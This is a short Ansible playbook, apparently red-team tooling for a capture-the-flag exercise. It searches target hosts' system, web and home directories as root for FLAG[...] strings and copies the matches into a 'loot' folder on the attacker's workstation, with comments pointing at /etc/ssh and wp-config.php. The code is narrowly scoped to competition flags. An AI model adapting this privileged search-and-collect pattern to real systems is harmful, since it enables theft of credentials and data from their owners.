---
# Pre-req: Create a local folder for the loot
- name: Create local loot directory
  delegate_to: localhost
  file:
    path: "{{ playbook_dir }}/loot/{{ inventory_hostname }}"
    state: directory
    mode: '0755'
  become: no

# THE TARGETED HUNT: Only matches FLAG[...]
- name: Targeted Flag Extraction
  become: yes  # Mandatory to read /etc/ssh and wp-config.php
  shell: |
    grep -rEho "FLAG\[[^]]+\]" /etc /var/www /home /tmp 2>/dev/null
  register: fs_matches
  failed_when: false
  changed_when: false

# THE DELIVERY: Save to Red Workstation
- name: Save findings to Red Team Workstation
  delegate_to: localhost
  copy:
    content: |
      === TARGETED FLAG REPORT: {{ inventory_hostname }} ===
      
      [MATCHES]
      {{ fs_matches.stdout if fs_matches.stdout != "" else "No valid flags found." }}
    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/flags_report.txt"
  become: no

# THE LIVE FEED: Instant terminal alert
- name: "LIVE FLAG ALERT: {{ inventory_hostname }}"
  debug:
    msg: "{{ fs_matches.stdout_lines }}"
  when: fs_matches.stdout != ""